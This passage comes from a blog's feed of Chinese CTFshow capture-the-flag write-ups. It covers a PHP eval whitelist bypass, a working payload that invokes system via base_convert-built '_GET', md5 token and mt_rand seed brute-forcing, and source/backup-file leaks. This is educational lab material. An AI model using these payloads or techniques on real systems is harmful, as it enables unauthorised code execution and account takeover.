class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-解题思路：-1"><a href="#一-解题思路：-1" class="headerlink" title="一.解题思路："></a>一.解题思路：</h2><p>这道题给我们留了很多的数学函数，我们发现其中基本全是php中可用使用的函数。而且很多是可用进行进制转换的。我们来看下具体的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">base_convert(number,frombase,tobase);</span><br><span class="line">参数描述</span><br><span class="line">number    必需。规定要转换的数。</span><br><span class="line">frombase必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">tobase    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line"></span><br><span class="line">bindec — 二进制转换为十进制</span><br><span class="line">bindec ( string $binary_string ) : number</span><br><span class="line"></span><br><span class="line">decbin — 十进制转换为二进制</span><br><span class="line">decbin ( int $number ) : string</span><br><span class="line"></span><br><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">dechex ( int $number ) : string</span><br><span class="line"></span><br><span class="line">decoct — 十进制转换为八进制</span><br><span class="line">decoct ( int $number ) : string</span><br><span class="line"></span><br><span class="line">hexdec — 十六进制转换为十进制</span><br><span class="line">hexdec ( int $number ) : string</span><br></pre></td></tr></table></figure><p>在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。<br>假设我们要构造出如下表达式<br><code>c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag</code><br>我们需要构造的是其实只有 _GET，$我们可用使用，中括号可用花括号代替，小括号也是可以使用的。这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。<br>那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。<br>我们发现36进制中包含了所有的数字和字母，所有只需要将hex2bin按照36进制转换成10进制就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo base_convert(&#x27;hex2bin&#x27;, 36, 10);</span><br><span class="line">结果  37907361743</span><br><span class="line"></span><br><span class="line">echo hexdec(bin2hex(&quot;_GET&quot;));</span><br><span class="line">结果 1598506324</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在我们要做的就是反过来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(&#x27;37907361743&#x27;,10,36);    hex2bin</span><br><span class="line"></span><br><span class="line">base_convert(&#x27;37907361743&#x27;,10,36)(dechex(&#x27;1598506324&#x27;));    _GET</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=tac f*</span><br></pre></td></tr></table></figure><p>我们再把_GET进行替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=tac f*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 爆破</title>
      <link href="/2022/07/06/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/"/>
      <url>/2022/07/06/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>我们随便输入并使用bs抓包得</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-06214010.png"></p><p>通过对这串进行base64解码得此处就是我们输入的账号与密码，形式为：账号：密码</p><p>我们使用BS中的测试器模块</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/2.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/3.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/1.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-06214809.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-06214913.png"></p><p>开始攻击</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-06215517.png"></p><p>得到flag</p><h1 id="web-22"><a href="#web-22" class="headerlink" title="web 22"></a>web 22</h1><p>现在子域名无法爆破出来，直接查看hint得到flag</p><h1 id="web-23"><a href="#web-23" class="headerlink" title="web 23"></a>web 23</h1><p>分析源码，我们可以知道token首先被md5进行加密，而且它的第一位=第14位=第17位，（第一位+第十四位+第十七位）/第一位=第三十一位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写一个简单的php爆一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$v1</span>=<span class="number">0</span>;<span class="variable">$v1</span>&lt;<span class="number">10</span>;<span class="variable">$v1</span>++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$v2</span>=<span class="number">0</span>;<span class="variable">$v2</span>&lt;<span class="number">10</span>;<span class="variable">$v2</span>++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$v3</span>=<span class="number">0</span>;<span class="variable">$v3</span>&lt;<span class="number">10</span>;<span class="variable">$v3</span>++)&#123;</span><br><span class="line">            <span class="variable">$v</span>=<span class="variable">$v1</span>.<span class="variable">$v2</span>.<span class="variable">$v3</span>;</span><br><span class="line">            <span class="variable">$token</span> = md5(<span class="variable">$v</span>);</span><br><span class="line">            <span class="keyword">if</span> (substr(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === substr(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) === substr(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>)) + intval(substr(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>)) + substr(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) / substr(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === intval(substr(<span class="variable">$token</span>, <span class="number">31</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果是422</p><h1 id="web-24"><a href="#web-24" class="headerlink" title="web 24"></a>web 24</h1><p>通过分析源代码我们可以知道</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP随机数的漏洞：</p><p>由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用· mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。</p><p>唯一可能出问题的点就是PHP的版本，不同的版本在相同的种子下给的随机数也不同，因此PHP的大版本要相同，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo intval(mt_rand());</span><br></pre></td></tr></table></figure><h1 id="web-25"><a href="#web-25" class="headerlink" title="web 25"></a>web 25</h1><p><strong>一.涉及工具：</strong><br> php_mt_seed<a href="https://github.com/openwall/php_mt_seed">下载地址</a></p><p>此脚本用于伪随机数漏洞，生成伪随机数是线性的，你可以理解为y=ax,x就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数),当然实际上更复杂肯定。</p><p>我知道种子后，可以确定你输出伪随机数的序列。</p><p>知道你的随机数序列，可以确定你的种子。</p><p>用到的是爆破，已经有写好的C脚本了。</p><p>这里简单的介绍下这个脚本咋用</p><p>kali下，进入目录，make</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-07175302.png"></p><p>使用<code> time ./php_mt_seed-main 随机数</code> </p><p>来推出种子</p><p><strong>二.解题思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());  //intval()用于获取变量的整数值</span><br><span class="line">    if((!$rand))&#123;          //只有rand=0的时候才会执行以下语句，所以我们采用r =0;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>1.分析php代码，可以先通过r=0 得到mt_rand()第一个值为644268232（每个人得到的数字不同）</p><p>2.之后我们进行逆推，推出种子</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-07180220.png"></p><p>3.通过如下代码，我们知道要将两个随机数相加得token值</p><p><code>if($_COOKIE[‘token’]==(mt_rand()+mt_rand()))</code></p><p>通过响应头可知PHP的版本为7.311</p><p>4.经过尝试我们得到种子和token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(2835652841);</span><br><span class="line">echo mt_rand().&quot;\n&quot;;</span><br><span class="line">echo mt_rand()+mt_rand();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">644268232</span><br><span class="line">2187070716</span><br></pre></td></tr></table></figure><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-07182019.png"></p><p>得到flag</p><h1 id="web-26"><a href="#web-26" class="headerlink" title="web 26"></a>web 26</h1><p>在数据库页面发现代码，对传参没有要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function check()&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#x27;checkdb.php&#x27;,</span><br><span class="line">type: &#x27;POST&#x27;,</span><br><span class="line">dataType:&#x27;json&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">&#x27;a&#x27;:$(&#x27;#a&#x27;).val(),</span><br><span class="line">&#x27;p&#x27;:$(&#x27;#p&#x27;).val(),</span><br><span class="line">&#x27;d&#x27;:$(&#x27;#d&#x27;).val(),</span><br><span class="line">&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">&#125;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(data[&#x27;msg&#x27;]);</span><br><span class="line">&#125;,</span><br><span class="line">error:function(data)&#123;</span><br><span class="line">alert(data[&#x27;msg&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-07183931.png"></p><p>得到flag</p><h1 id="web-27"><a href="#web-27" class="headerlink" title="web 27"></a>web 27</h1><p>1.下载录取名单</p><p>2.通过查询系统爆破</p><p>3.可以发现中间正好少了出生年月日</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/04b11cc80d186e6b872e43108ce09846.png"></p><p>4.成功后看回显,知道学号以及密码为身份证号码</p><p>5.登录得到flag</p><h1 id="web-28"><a href="#web-28" class="headerlink" title="web 28"></a>web 28</h1><p>1.通过原始url知道爆破目录</p><p>爆破得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-信息收集</title>
      <link href="/2022/07/04/CTFshow-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/07/04/CTFshow-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h1><p>直接查看源代码即可得到flag </p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>本题禁用了右键和f12,通过<code>Ctrl+u</code>或者在url前面添加<code>view-source:</code>也可获得<code>flag</code></p><h1 id="web3-响应头"><a href="#web3-响应头" class="headerlink" title="web3 响应头"></a>web3 响应头</h1><p>右键查看源代码 ，什么都没有发现，直接抓包，在响应包中发现flag</p><h1 id="web4-robots-txt"><a href="#web4-robots-txt" class="headerlink" title="web4 robots.txt"></a>web4 robots.txt</h1><p>访问robots.txt发现/flagishere.txt。访问flagishere.txt得到flag.</p><h1 id="web5-index-phps"><a href="#web5-index-phps" class="headerlink" title="web5 index.phps"></a>web5 index.phps</h1><p>访问index.phps得到flag</p><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p><p>它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。</p><h1 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6 www.zip"></a>web6 <a href="http://www.zip/">www.zip</a></h1><p>尝试一下常见的源码包名字<code>www.zip</code>，即可下载压缩包，在压缩包中发现flag,但提交是错的，访问一下fl000g.txt这个地址，发现了真正的flag</p><h1 id="web7-git"><a href="#web7-git" class="headerlink" title="web7 git"></a>web7 git</h1><p>版本控制器，不是<code>git泄露</code>就是<code>svn泄露</code></p><p>此题通过访问<code>/.git/</code>即可获得<code>flag</code></p><h1 id="web8-svn"><a href="#web8-svn" class="headerlink" title="web8 svn"></a>web8 svn</h1><p>版本控制器，不是<code>git泄露</code>就是<code>svn泄露</code></p><p>此题通过访问<code>/.svn/</code>即可获得<code>flag</code></p><h1 id="web9-vim缓存"><a href="#web9-vim缓存" class="headerlink" title="web9 vim缓存"></a>web9 vim缓存</h1><p>通过访问<code>index.php.swp</code>，访问首页中的交换文件下载缓存文件</p><p>vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等.</p><p><a href="https://blog.csdn.net/qq_41497476/article/details/106992025">https://blog.csdn.net/qq_41497476/article/details/106992025</a></p><h1 id="web10-cookie"><a href="#web10-cookie" class="headerlink" title="web10 cookie"></a>web10 cookie</h1><p>通过观察网络数据包中的cookie发现flag</p><h1 id="web11-域名解析"><a href="#web11-域名解析" class="headerlink" title="web11 域名解析"></a>web11 域名解析</h1><p>发现ctfshow.com隐藏了一条信息，通过常用的域名解析网址<code>dbcha.com</code>找到TXT中有flag</p><h1 id="web12-公开信息"><a href="#web12-公开信息" class="headerlink" title="web12 公开信息"></a>web12 公开信息</h1><p>在页面最下端发现电话号码</p><p>通过访问admin尝试进行管理员账号登录，账号填写<code>admin</code>，密码则是电话号码</p><p>即可获取<code>flag</code></p><h1 id="web13-技术文档敏感信息"><a href="#web13-技术文档敏感信息" class="headerlink" title="web13 技术文档敏感信息"></a>web13 技术文档敏感信息</h1><p>页面滑道最下方发现小写的<code>document</code></p><p>访问即可获得一些敏感信息</p><p>通过访问<code>/system1103/login.php</code>，并用其泄露的账号密码进行登录</p><p>即可获得<code>flag</code></p><h1 id="web14-editor"><a href="#web14-editor" class="headerlink" title="web14 editor"></a>web14 editor</h1><p>根据题目访问<code>/editor/</code></p><p>在其图片空间中找到flag路径</p><p><code>/editor/attached/image/var/www/html/nothinghere/fl000g.txt</code></p><p>通过访问<code>/nothinghere/fl000g.txt</code>即可获得<code>flag</code></p><h1 id="web15-邮箱地址"><a href="#web15-邮箱地址" class="headerlink" title="web15 邮箱地址"></a>web15 邮箱地址</h1><p>题目提示<code>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</code></p><p>我们滑到页面最底部发现其邮箱：<code>1156631961@qq.com</code></p><p>访问admin进入后台登录系统</p><p>点击忘记密码，填写其qq所在地西安，即可重置密码</p><p>再通过账号<code>admin</code>,密码<code>admin7789</code>即可获取<code>flag</code></p><h1 id="web16-tz-php"><a href="#web16-tz-php" class="headerlink" title="web16 tz.php"></a>web16 tz.php</h1><p>题目提示<code>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</code></p><p>通过提示我们直接访问<code>tz.php</code></p><p>然后进一步访问<code>phpinfo</code>即可获得<code>flag</code></p><h1 id="web17-sql文件泄露"><a href="#web17-sql文件泄露" class="headerlink" title="web17 sql文件泄露"></a>web17 sql文件泄露</h1><p>访问backup.sql</p><p>在下载的文件里找到flag</p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p>在JS中找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(score&gt;100)</span><br><span class="line">&#123;</span><br><span class="line">var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行Unicode解码</p><p>根据谐音提示访问<code>110.php</code>,获得<code>flag</code></p><h1 id="web19-前端密钥"><a href="#web19-前端密钥" class="headerlink" title="web19 前端密钥"></a>web19 前端密钥</h1><p>通过访问源码，发现其账号密码</p><p>通过<code>post传参</code>绕过前端验证获取<code>flag</code></p><h1 id="web20-mdb文件"><a href="#web20-mdb文件" class="headerlink" title="web20 mdb文件"></a>web20 mdb文件</h1><p>根据题目提示访问路径<code>/db/db.mdb</code>，下载<code>mdb文件</code></p><p>通过访问<code>db.mdb</code>查找关键词<code>flag</code>，获得最终<code>flag</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter</title>
      <link href="/2022/07/03/Meterpreter/"/>
      <url>/2022/07/03/Meterpreter/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/Screenshot_20220928_073538_org.mozilla.firefox.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
